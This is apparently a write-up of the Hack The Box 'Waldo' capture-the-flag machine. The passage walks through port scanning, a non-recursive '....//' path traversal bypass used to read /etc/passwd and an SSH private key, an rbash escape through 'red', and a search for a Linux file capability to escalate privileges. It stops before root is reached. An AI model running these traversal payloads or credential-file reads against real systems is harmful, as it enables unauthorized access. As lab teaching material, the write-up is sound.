# MACHINE CHALLENGE: WALDO

## Challenge Description

##### Own system
Type below the hash that is inside the root.txt file in the machine. The file
can be found under /root on Linux machines and at the Desktop of the
Administrator on Windows.

##### Own User
Type below the hash that is inside the user.txt file in the machine. The file
can be found under /home/{username} on Linux machines and at the Desktop of the
user on Windows. 

```
IP Address: 10.10.10.87
OS: Linux
```

### PORTSCANNING w/ NMAP

As always, we start with a `nmap` portscan..

```
$ sudo nmap -n -sS -A -T4 10.10.10.87
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-06 23:08 EDT
Nmap scan report for 10.10.10.87
Host is up (0.43s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
80/tcp   open     http           nginx 1.12.2
|_http-server-header: nginx/1.12.2
| http-title: List Manager
|_Requested resource was /list.html
|_http-trane-info: Problem with XML parsing of /evox/about
8888/tcp filtered sun-answerbook
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), DD-WRT (Linux 3.18) (95%), DD-WRT v3.0 (Linux 4.4.2) (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Android 4.2.2 (Linux 3.4) (94%), Android 4.1.2 (94%), Android 4.1.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   178.50 ms 10.10.16.1
2   178.96 ms 10.10.10.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.13 seconds
```

Okay, so we have 22(SSH), 80(HTTP), 8888(SUN-ANSWERBOOK).

### ENUMERATE PORT 80

Hitting `http://10.10.10.87` redirects us to `http://10.10.10.87/list.html`..

<img src="browser-list.jpg" width=500px>

Looks like we can add and delete lists from a "List Manager" page. Clicking on the
list gives a page that allows us to create and delete items to the list which have
a default name of `New Item` which can be renamed to a custom string.

#### GOBUSTER

```
$ gobuster -e -u 10.10.10.87 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.87/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2018/10/06 23:24:40 Starting gobuster
=====================================================
2018/10/06 23:24:42 [-] Wildcard response found: http://10.10.10.87/2eb57f44-f26a-4c8e-8d95-12955fd8cf72 => 302
2018/10/06 23:24:42 [!] To force processing of Wildcard responses, specify the '-fw' switch.
=====================================================
2018/10/06 23:24:42 Finished
=====================================================
```

Hm.. `gobuster` isn't going to work for us likely because of the redirect?

#### BURPSUITE

Let's examine what's happening when we interact with this "waldo" application with
`burpsuite`.

When we try and "create" a list, it is a `POST` call to `/fileWrite.php` with the
parameters `listnum=1&data=` ("1" being the list identifier).

When we try and click on our newly created list, it is `POST` call to `/fileRead.php`
with the parameters `file=./.list/list1` (".list" appears to be the directory where
our list files are written).

When we try and create a new item in our list, it is a `POST` call to `/fileWrite.php`
with parameters `listnum=1&data=("1":"test")` (we are now starting to better
understand the calling convention to `fileWrite.php`).

When we click the "back" button from the file element screen, we find it is a `POST`
call to `/dirRead.php` with parameter `path=./.list/`. This is a very interesting
script because it may help us enumerate what else is on the system!

```
$ curl -d "path=./" -X POST http://10.10.10.87:80/dirRead.php
[".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
```

So exploiting the `dirRead.php` script, we discover a full listing of files related to
the webapp..

```
1. dirRead.php
2. fileDelete.php
3. fileRead.php
4. fileWrite.php
5. index.php
6. list.html
7. list.js
8. .list
9. background.jpg
10. cursor.png
11. face.png
```

##### DIREAD.PHP

Now we can exploit the `fileRead.php` script to dump the contents of these files..

```
$ curl -d "file=./dirRead.php" -X POST http://10.10.10.87:80/fileRead.php
{"file":"<?php\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\tif(isset($_POST['path'])){\n\t\theader('Content-type: application\/json');\n\t\t$_POST['path'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['path']);\n\t\techo json_encode(scandir(\"\/var\/www\/html\/\" . $_POST['path']));\n\t}else{\n\t\theader('Content-type: application\/json');\n\t\techo '[false]';\n\t}\n}\n"}
```

```
<?php

if ($_SERVER['REQUEST_METHOD'] === \"POST\") {
  if(isset($_POST['path'])){
    header('Content-type: application\/json');
    $_POST['path'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['path']);
    echo json_encode(scandir(\"\/var\/www\/html\/\" . $_POST['path']));
  } else {
    header('Content-type: application\/json');
    echo '[false]';
  }
}
```

We see our `dirRead.php` takes our parameter `path` and appends it to `/var/www/html`
and has some sanitization against the parameter striping out `..` to prevent
malicious directory surfing. Smart.

##### FILEREAD.PHP

```
$ curl -d "file=./fileRead.php" -X POST http://10.10.10.87:80/fileRead.php
{"file":"<?php\n\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\t$fileContent['file'] = false;\n\theader('Content-Type: application\/json');\n\tif(isset($_POST['file'])){\n\t\theader('Content-Type: application\/json');\n\t\t$_POST['file'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['file']);\n\t\tif(strpos($_POST['file'], \"user.txt\") === false){\n\t\t\t$file = fopen(\"\/var\/www\/html\/\" . $_POST['file'], \"r\");\n\t\t\t$fileContent['file'] = fread($file,filesize($_POST['file']));  \n\t\t\tfclose();\n\t\t}\n\t}\n\techo json_encode($fileContent);\n}\n"}
```

```
<?php

if($_SERVER['REQUEST_METHOD'] === \"POST\"){
  $fileContent['file'] = false;
  header('Content-Type: application\/json');
  if(isset($_POST['file'])){
    header('Content-Type: application\/json');
    $_POST['file'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['file']);
    if(strpos($_POST['file'], \"user.txt\") === false){
      $file = fopen(\"\/var\/www\/html\/\" . $_POST['file'], \"r\");
      $fileContent['file'] = fread($file,filesize($_POST['file']));
      fclose();
    }
  }
  echo json_encode($fileContent);
}
```

Here in `fileRead.php`, we similar protection mechanisms where `..` is striped out as
well as a guard against reading `user.txt`. Smart.

##### FILEWRITE.PHP

```
$ curl -d "file=./fileWrite.php" -X POST http://10.10.10.87:80/fileRead.php
{"file":"<?php\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\theader('Content-Type: application\/json');\n\t$condition['result'] = false;\n\tif(isset($_POST['listnum'])){\n\t\tif(is_numeric($_POST['listnum'])){\n\t\t\t$myFile = \"\/var\/www\/html\/.list\/list\" . $_POST['listnum'];\n\t\t\t$handle = fopen($myFile, 'w');\n\t\t\t$data = $_POST['data'];\n\t\t\tfwrite($handle, $data);\n\t\t\tfclose();\n\t\t\t$condition['result'] = true;\n\t\t}\n\t}\n\techo json_encode($condition);\n}\n"}
```

```
<?php

if($_SERVER['REQUEST_METHOD'] === \"POST\"){
  header('Content-Type: application\/json');
  $condition['result'] = false;
  if(isset($_POST['listnum'])){
    if(is_numeric($_POST['listnum'])){
      $myFile = \"\/var\/www\/html\/.list\/list\" . $_POST['listnum'];
      $handle = fopen($myFile, 'w');
      $data = $_POST['data'];
      fwrite($handle, $data);
      fclose();
      $condition['result'] = true;
    }
  }
  echo json_encode($condition);
}
```

In `fileWrite.php`, we see the file name is built from a concatentation of the
`listnum` parameter to `/var/www/html/.list/list` which appears to prevent us from
overwriting arbitrary files and attempting to execute them.

##### FILEDELETE.PHP

```
$ curl -d "file=./fileDelete.php" -X POST http://10.10.10.87:80/fileRead.php
{"file":"<?php\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\tif(isset($_POST['listnum'])){\n\t\theader('Content-Type: application\/json');\n\t\tif(is_numeric($_POST['listnum'])){\n\t\t\t$myFile = \"\/var\/www\/html\/.list\/list\" . $_POST['listnum'];\n\t\t\tunlink($myFile);\n\t\t\theader('Content-Type: application\/json');\n\t\t\techo '[true]';\n\t\t}else{\n\t\t\theader('Content-Type: application\/json');\n\t\t\techo '[false]';\n\t\t}\n\t}else{\n\t\theader('Content-Type: application\/json');\n\t\techo '[false]';\n\t}\n}\n"}
```

```
<?php

if($_SERVER['REQUEST_METHOD'] === \"POST\"){
  if(isset($_POST['listnum'])){
    header('Content-Type: application\/json');
    if(is_numeric($_POST['listnum'])){
      $myFile = \"\/var\/www\/html\/.list\/list\" . $_POST['listnum'];
      unlink($myFile);
      header('Content-Type: application\/json');
      echo '[true]';
    }else{
      header('Content-Type: application\/json');
      echo '[false]';
    }
  }else{
    header('Content-Type: application\/json');
    echo '[false]';
  }
}
```

For completeness, we examine `fileDelete.php` and notice the same basic protection
logic as in `fileWrite.php`.

### TRAVERSAL ATTACK

We need tobypass that filter that is blocking us from looking outside
`/var/www/html`.  The line of code in question from `dirRead.php` is..

```
$_POST['path'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['path']);
```

The `str_replace()` function has the following definition..

```
str_replace ( $search , $replace , $subject)

search
  The value being searched for, otherwise known as the needle. An array may be
  used to designate multiple needles.

replace
  The replacement value that replaces found search values. An array may be used to
  designate multiple replacements.

subject
  The string or array being searched and replaced on, otherwise known as the haystack.
```

Alright, so our filter is searching for all instances of `../` and `..\` and
replacing them with the empty string `""`. We can write a simple test case that
shows this filter in action that will allow us to try different inputs to see
what we can do..

```
$ cat test_filter.php
<?php
  $param = "./.list/";
  $param = $argv[1];
  $param = str_replace( array("../", "..\\"), "", $param);
  echo "/var/www/html/" . $param;
  echo "\n";
?>
```

Reading up how we can defeat traversal attack filtering..

```
https://tipstrickshack.blogspot.com/2013/02/how-to-bypassing-filter-to-traversal_8831.html
```

We note that since the code does not apply the traversal sanitization sequence
recursively, it is possible to bypass the filter by placing one sequence within
another!

```
$ php test_filter.php "../.."
/var/www/html/..
$ php test_filter.php "....//"
/var/www/html/../
$ php test_filter.php "....//....//"
/var/www/html/../../
```

And our test script proves that `....//` pattern works since only the middle
`../` is filtered out leaving the outer `..` and `/` behind to make `../`!

Let's try it against the actual script on the server..

```
$ curl -X POST http://10.10.10.87:80/dirRead.php -d "path=....//....//....//etc/"
[".","..","TZ","alpine-release","apk","ca-certificates","ca-certificates.conf","conf.d","crontabs","default","environment","fstab","group","group-","hostname","hosts","init.d","inittab","issue","localtime","login.defs","logrotate.d","modprobe.d","modules","modules-load.d","motd","mtab","network","nginx","opt","os-release","pam.d","passwd","passwd-","periodic","php7","profile","profile.d","protocols","resolv.conf","securetty","security","services","shadow","shadow-","shells","ssh","ssl","supervisor","supervisord.conf","sysctl.conf","sysctl.d","terminfo","udhcpd.conf","vim"]
```

And there we have it.. we are able to perform a directory listing on `/etc`! Let's
use `fileRead.php` to dump `/etc/passwd`..

```
$ curl -X POST http://10.10.10.87:80/fileRead.php -d "file=....//....//....//etc/passwd"
{"file":"root:x:0:0:root:\/root:\/bin\/ash\nbin:x:1:1:bin:\/bin:\/sbin\/nologin\ndaemon:x:2:2:daemon:\/sbin:\/sbin\/nologin\nadm:x:3:4:adm:\/var\/adm:\/sbin\/nologin\nlp:x:4:7:lp:\/var\/spool\/lpd:\/sbin\/nologin\nsync:x:5:0:sync:\/sbin:\/bin\/sync\nshutdown:x:6:0:shutdown:\/sbin:\/sbin\/shutdown\nhalt:x:7:0:halt:\/sbin:\/sbin\/halt\nmail:x:8:12:mail:\/var\/spool\/mail:\/sbin\/nologin\nnews:x:9:13:news:\/usr\/lib\/news:\/sbin\/nologin\nuucp:x:10:14:uucp:\/var\/spool\/uucppublic:\/sbin\/nologin\noperator:x:11:0:operator:\/root:\/bin\/sh\nman:x:13:15:man:\/usr\/man:\/sbin\/nologin\npostmaster:x:14:12:postmaster:\/var\/spool\/mail:\/sbin\/nologin\ncron:x:16:16:cron:\/var\/spool\/cron:\/sbin\/nologin\nftp:x:21:21::\/var\/lib\/ftp:\/sbin\/nologin\nsshd:x:22:22:sshd:\/dev\/null:\/sbin\/nologin\nat:x:25:25:at:\/var\/spool\/cron\/atjobs:\/sbin\/nologin\nsquid:x:31:31:Squid:\/var\/cache\/squid:\/sbin\/nologin\nxfs:x:33:33:X Font Server:\/etc\/X11\/fs:\/sbin\/nologin\ngames:x:35:35:games:\/usr\/games:\/sbin\/nologin\npostgres:x:70:70::\/var\/lib\/postgresql:\/bin\/sh\ncyrus:x:85:12::\/usr\/cyrus:\/sbin\/nologin\nvpopmail:x:89:89::\/var\/vpopmail:\/sbin\/nologin\nntp:x:123:123:NTP:\/var\/empty:\/sbin\/nologin\nsmmsp:x:209:209:smmsp:\/var\/spool\/mqueue:\/sbin\/nologin\nguest:x:405:100:guest:\/dev\/null:\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/home\/nobody:\/bin\/sh\nnginx:x:100:101:nginx:\/var\/lib\/nginx:\/sbin\/nologin\n"}
```

.. and we discover our target user appears to be `nobody` with UID `65534`!

### OWN USER

Let's see what we can find out user `nobody`..

```
$ curl -X POST ht/dirRead.php -d "path=....//....//....//home/nobody"
[".","..",".ash_history",".ssh",".viminfo","user.txt"]
```

.. we find out `user.txt`, but note earlier that we aren't able to use
`fileRead.php` to dump it since there was a line of code preventing us. We see
however, a `.ssh` directory that contains a file called `.monitor`` file which
appears to be a `ssh` private key!

```
$ curl -X POST http://10.10.10.87:80/fileRead.php -d "file=....//....//....//home/nobody/.ssh/.monitor"
{"file":"-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl\nmR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f\n87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS\ndGCc\/gNpW\/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN\no8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8\/6pceowqs9ujRkNzH9T1lJq4Fx1V\nvi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl\/wdmuPEW6kU\nvmzhRU3gcjuzwBET0TNejbL\/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR\/6\npKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5\n8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q\n1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox\/05qoOBL4kQxUM7\nVxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS\ndVa3yLECgYEA7jk51MvUGSIFF6GkXsNb\/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO\nv0og0X\/iROXAcp6Z9WGpIc6FhVgJd\/4bNlTR+A\/lWQwFt1b6l03xdsyaIyIWi9xr\nxsb2sLNWP56A\/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY\nqFfdAWrvVZjp26Yf\/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI\nyzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1\n\/pAcw\/+\/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw\/IMnLa3drm3CIAa32iU\nLRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ\/\nlnN2n1WyTIyEuGA\/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp\nw7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9\n1HLmBkDTjjj\/xAJAZuiOF4Rs\/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT\nrj1BhUCzZCUgQABtpC6vYj\/HLLlzpiC05AIEhDdvToPK\/0WuY64fds0VccAYmMDr\nX\/PlAoGAS6UhbCm5TWZhtL\/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2\nDvVny8gKbM\/OenwHnTlwRTEj5qdeAM40oj\/mwCDc6kpV1lJXrW2R5mCH9zgbNFla\nW0iKCBUAm5xZgU\/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=\n-----END RSA PRIVATE KEY-----"}
```

Let's write a quick script to clean this up into something usable..

```
$ ./print_id_rsa.pl > id_rsa.nobody
```

```
$ ssh -i id_rsa.nobody nobody@10.10.10.87
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.
waldo:~$ ls
user.txt
waldo:~$ cat user.txt
32768bcd7513275e085fd4e7b63e9d24
```

And we're in!

```
waldo:~$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
```

Interesting to note that the authorized public key is associated with
`monitor@waldo`, so that seems to make sense why there was a hidden file called
`.monitor` containing the private key.

### OWN SYSTEM

Firing off our LinEnum.sh script..

```
$ scp -i id_rsa.nobody LinEnum.sh  nobody@10.10.10.87:/tmp/LinEnum.sh
```

```
$ chmod +x /tmp/LinEnum.sh
$ /tmp/LinEnum.sh -t -r LinEnum-nobody.out
```

.. scanned through the report, but nothing immediately jumped out as being
interesting.

Poking around the system, we find a potentially interesting file at the root..

```
waldo:/$ ls -l /.dockerenv
-rwxr-xr-x    1 root     root             0 May  3 20:50 /.dockerenv
```

Examining the processes running on the system, two things jump out: 1. the
`ssh` of `monitor@localhost` and `supervisord`.

```
waldo:/$ ps -ef
PID   USER     TIME   COMMAND
    1 root       0:05 {supervisord} /usr/bin/python2 /usr/bin/supervisord -c /etc
    7 root       0:00 nginx: master process nginx -g daemon off;
    8 root       0:00 /usr/sbin/sshd -D -e
    9 root       0:00 {php-fpm7} php-fpm: master process (/etc/php7/php-fpm.conf)
   10 nginx      0:05 nginx: worker process
   23 root       0:00 sshd: nobody [priv]
   25 nobody     0:00 sshd: nobody@pts/1
   26 nobody     0:00 -sh
   28 nobody     0:00 ssh -i /home/nobody/.ssh/.monitor monitor@localhost -t bash
   31 root       0:00 sshd: nobody [priv]
   33 nobody     0:00 sshd: nobody@pts/2
   34 nobody     0:00 -sh
   41 nobody     0:00 ssh -i mono.txt monitor@127.0.1.1
   93 root       0:00 sshd: nobody [priv]
   95 nobody     0:00 sshd: nobody@pts/3
   96 nobody     0:00 -sh
  125 root       0:00 sshd: nobody [priv]
  128 nobody     0:00 sshd: nobody@pts/4
  129 nobody     0:00 -sh
  144 nobody     0:00 ssh -i .monitor monitor@10.10.10.87
  145 nobody     0:00 {php-fpm7} php-fpm: pool www
  146 nobody     0:00 {php-fpm7} php-fpm: pool www
  147 nobody     0:00 ps -ef
```

Let's try `ssh` into this `localhost` and see what we find?

```
waldo:/$ /usr/bin/whoami
nobody
waldo:/$ /usr/bin/id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
waldo:/$ /usr/bin/ssh -i /home/nobody/.ssh/.monitor monitor@localhost -t bash -nor
c
bash-4.4$ /usr/bin/whoami
monitor
bash-4.4$ /usr/bin/id
uid=1001(monitor) gid=1001(monitor) groups=1001(monitor)
bash-4.4$ ls /home
app-dev  monitor  steve
bash-4.4$ tail /etc/passwd
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
avahi-autoipd:x:105:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
monitor:x:1001:1001:User for editing source and monitoring logs,,,:/home/monitor:/bin/rbash
app-dev:x:1002:1002:User for managing app-dev,,,:/home/app-dev:/bin/bash
```

So I'm not exactly sure what happened, but appears that we might have just `ssh`
into maybe a `docker` instance running on that machine?? But upon further
examination of this "new" environment that we're in, it seems in fact that the
initial machine we logged into was the docker environment and now we are in the
host.

```
bash-4.4$ ps -ef | grep docker
root        529      1  0 12:02 ?        00:00:08 /usr/bin/dockerd -H fd://
root        541    529  0 12:02 ?        00:00:04 docker-containerd --config /var/run/docker/containerd/containerd.toml
root        726    541  0 12:02 ?        00:00:14 docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/16c6cae0786900838a54b9b3ce253ddd80c3ccdcea93e6c5444e2a8a5a1eaebd -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
monitor   71880  71765  0 13:02 pts/3    00:00:00 grep docker
```

Going back to the first system and logging into this new system without the
`-t bash -norc` gives us some nice ASCII art which seems to imply we are on the
right track :-)

```
waldo:/$ ssh -i /home/nobody/.ssh/.monitor monitor@localhost
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
           &.
          @@@,@@/ %
       #*/%@@@@/.&@@,
   @@@#@@#&@#&#&@@@,*%/
   /@@@&###########@@&*(*
 (@################%@@@@@.     /**
 @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/
 %@@@@%##########&@@@....                 .#%#@@@@@@@#
 @@&%#########@@@@/                        */@@@%(((@@@%
    @@@#%@@%@@@,                       *&@@@&%(((#((((@@(
     /(@@@@@@@                     *&@@@@%((((((((((((#@@(
       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,
          %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &
        *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/
       /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&
      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&
      %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/
      @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
     @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@*
     @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
     *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
       @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
        @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
          .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*
            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(
            .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/
           *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/
          *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@
          *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#
           (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@
             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#
               %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,
                ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@
                 &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@
                 /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(
                  @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*
                  *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@
                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,
                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
                        &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#
                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
                         ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,
                          *@@,,,,,,,.,****,..,,,,,,,,&@@
                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@
                           .@@,,,,,,,,,,,,,...,,,,,,@@
                            ,@@@,,,,,,,,,,,,,,,,.(@@@
                              %@@@@&(,,,,*(#&@@@@@@,

                            Here's Waldo, where's root?
Last login: Sun Oct  7 13:25:46 2018 from 127.0.0.1
```

.. but logging in this way drops us into a restricted shell (`rbash`). This looks
to be the way the creator of the box intended us to log in as we find we have
some tools at our disposal to "break" out of this "jail".

```
monitor@waldo:~$ echo $0
-rbash
monitor@waldo:~$ ls bin
ls  most  red  rnano
monitor@waldo:~$ red
!'/bin/sh'
$ /bin/bash
monitor@waldo:~$
```

.. and now we are back to our full `bash` shell :-)

Dragged our Linux enum script over to see what we could find..

```
waldo:/tmp$ scp -i /home/nobody/.ssh/.monitor /tmp/LinEnum.sh  monitor@localhost:/
tmp/LinEnum.sh
LinEnum.sh                            100%   39KB  16.0MB/s  39.2KB/s   00:00
```
```
$ /tmp/LinEnum.sh -t -r LinEnum-monitor.out
```

There certainly are a lot of SUID files, but none of them look obviously useful.

```
SUID files:
/bin/su
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
```

Looking around, we find some source for a program called `logMonitor` under a
directory `/home/monitor/app-dev/` and two versions of the executable.

```
bash-4.4$ find app-dev/
app-dev/
app-dev/v0.1
app-dev/v0.1/logMonitor-0.1
app-dev/logMonitor.bak
app-dev/logMonitor.o
app-dev/.restrictScript.sh
app-dev/logMonitor.c
app-dev/logMonitor.h
app-dev/makefile
app-dev/logMonitor
app-dev/logMonitor.h.gch
```

What is interest is that when we run the `app-dev/logMonitor -a` command has
different behaviour than when we run the `app-dev/v0.1/logMonitor-0.1 -a` command.

```
bash-4.4$ ./app-dev/logMonitor -a
Cannot open file
bash-4.4$ ./app-dev/v0.1/logMonitor-0.1 -a
Oct  7 14:49:51 waldo sshd[1005]: Accepted publickey for monitor from 127.0.0.1 port 38436 ssh2: RSA SHA256:Kl+zDjbDx4fQ7xVvGg6V3RhjezqB1gfe2kWqm1AMD0c
Oct  7 14:49:51 waldo sshd[1005]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
Oct  7 14:49:51 waldo systemd-logind[385]: New session 5 of user monitor.
```

Looking into `logMonitor.c` source file, we see the `-a` option is supposed to
print the file `/var/log/auth.log` which has restricted permissions..

```
switch (opt) {
  case 'a' :
    strncpy(filename, "/var/log/auth.log", sizeof(filename));
    printFile(filename);
    break;
```

So why is it that the v0.1 version of the executable able to read the file, but
the non-versioned executable can't? And can we take advantage of this behaviour
to read `root.txt`?

```
bash-4.4$ ls -l /var/log/auth.log
-rw-r----- 1 root adm 2306 Oct  7 15:17 /var/log/auth.log
```

Found out about a tool called `getcap` and `setcap` which appears to allow you
to display and set "capabilities on the queried file(s)".

```
bash-4.4$ /sbin/getcap app-dev/logMonitor
bash-4.4$ /sbin/getcap app-dev/v0.1/logMonitor-0.1
v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

So our "versioned" logMonitor has something called `cap_dac_read_search+ei`. Can
we modify the program to read `root.txt` and set this capability?

```
bash-4.4$ /sbin/setcap cap_dac_read_search+ei logMonitor
unable to set CAP_SETFCAP effective capability: Operation not permitted
```

Hm.. okay, so that makes sense that we can't as a non-privedged user grant super
powers to any file we wish, but I wonder then.. if there are other files lurking
around on the system which have these same elevated capabilities we can take
advantage of?

